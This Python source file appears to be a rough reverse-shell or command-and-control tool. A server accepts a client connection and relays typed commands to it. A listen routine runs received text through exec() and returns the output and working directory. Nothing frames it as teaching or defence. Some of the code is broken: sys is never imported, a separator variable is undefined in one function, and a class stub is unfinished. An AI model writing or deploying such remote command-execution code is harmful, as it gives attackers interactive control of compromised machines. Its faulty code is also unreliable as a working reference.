import socket
import os
from io import StringIO
import threading



class HLcommand():
    def __init__(self):
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.isconnected = False
        self.ip = ''
        self.port = ''

    def connect(self,HOST,PORT):
        self.s.bind((HOST, PORT))
        self.s.listen(5)
        self.ip = HOST
        self.port = PORT
        self.isconnected = True


    def command(self):
        pass

    def status(self):
        if self.isconnected: print("Connected to ", self.ip)
        else: print("No Connection. Please Run CONNECT")

def run_command(command):
    temp_out = StringIO()
    temp_err = StringIO()
    sys.stdout = temp_out
    sys.stderr = temp_err
    exec(command)
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__
    out = temp_out.getvalue()
    err = temp_err.getvalue()
    if (out): print(out,end='')
    if (err): print(err,file=sys.stderr,end='')
    return out, err

def listen(s,BUFFER_SIZE=1024 * 128):
    print('starting')
    while True:
        command = s.recv(BUFFER_SIZE).decode()

        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        else:
            print('RECIEVE COMMAND\n>', command)
            out, err = run_command(command)
            if (out): s.send(out.encode())
            if (err): s.send(err.encode())
            # execute the command and retrieve the results
            # output = subprocess.getoutput(command)

        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{out}{err}{SEPARATOR}{cwd}"
        s.send(message.encode())


def main():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = 80
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"
    # create a socket object
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    print(f"Listening at {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)
    while True:
        # get the command from prompt
        #thread = threading.Thread(target=listen,args=(s,))
        #thread.start()

        command = input(f"SERVER {cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        # split command output and current directory
        #results, cwd = output.split(SEPARATOR)
        # print output
        print(output,end='')

if __name__ == '__main__':
    main()